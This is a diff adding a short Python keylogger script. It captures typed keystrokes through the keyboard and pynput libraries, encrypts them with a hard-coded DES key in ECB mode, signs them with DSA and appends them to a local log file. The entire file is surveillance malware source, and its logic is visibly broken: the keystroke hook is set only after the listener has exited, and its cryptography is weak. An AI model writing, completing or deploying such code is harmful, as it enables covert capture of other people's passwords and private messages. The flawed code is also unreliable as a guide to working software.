@@ -1,0 +1,67 @@
+﻿import keyboard
+import pynput
+from Crypto.Cipher import DES
+from Crypto.PublicKey import DSA
+from Crypto.Signature import DSS
+from Crypto.Hash import SHA256
+import json
+
+
+# Generate DES key
+des_key = b'abcdefgh'
+des_cipher = DES.new(des_key, DES.MODE_ECB)
+
+
+# Generate DSA key pair
+dsa_key = DSA.generate(2048)
+dsa_public_key = dsa_key.publickey()
+
+
+def encrypt_data(data):
+    padded_data = data + b' ' * (8 - len(data) % 8)  # Pad data to multiple of 8 bytes
+    encrypted_data = des_cipher.encrypt(padded_data)
+    return encrypted_data
+
+
+def decrypt_data(encrypted_data):
+    decrypted_data = des_cipher.decrypt(encrypted_data).rstrip(b' ')
+    return decrypted_data
+
+
+def sign_data(data):
+    hash_data = SHA256.new(data)
+    signer = DSS.new(dsa_key, 'fips-186-3')
+    signature = signer.sign(hash_data)
+    return signature
+
+
+def verify_signature(signature, data):
+    hash_data = SHA256.new(data)
+    verifier = DSS.new(dsa_public_key, 'fips-186-3')
+    try:
+        verifier.verify(hash_data, signature)
+        return True
+    except ValueError:
+        return False
+
+
+def log_keystrokes(key):
+    try:
+        current_keystrokes = keyboard.get_typed_strings(keyboard.record())
+        encrypted_keystrokes = encrypt_data(json.dumps(current_keystrokes).encode())
+        signature = sign_data(encrypted_keystrokes)
+        with open('keystrokes.log', 'a') as f:
+            f.write(json.dumps({'keystrokes': list(encrypted_keystrokes), 'signature': list(signature)}) + '\n')
+    except Exception as e:
+        print(f"Error logging keystrokes: {e}")
+
+
+def on_release(key):
+    if key == pynput.keyboard.Key.esc:
+        return False
+
+
+# Start the keylogger
+with pynput.keyboard.Listener(on_press=None, on_release=on_release) as listener:
+    listener.join()
+    keyboard.hook(log_keystrokes)
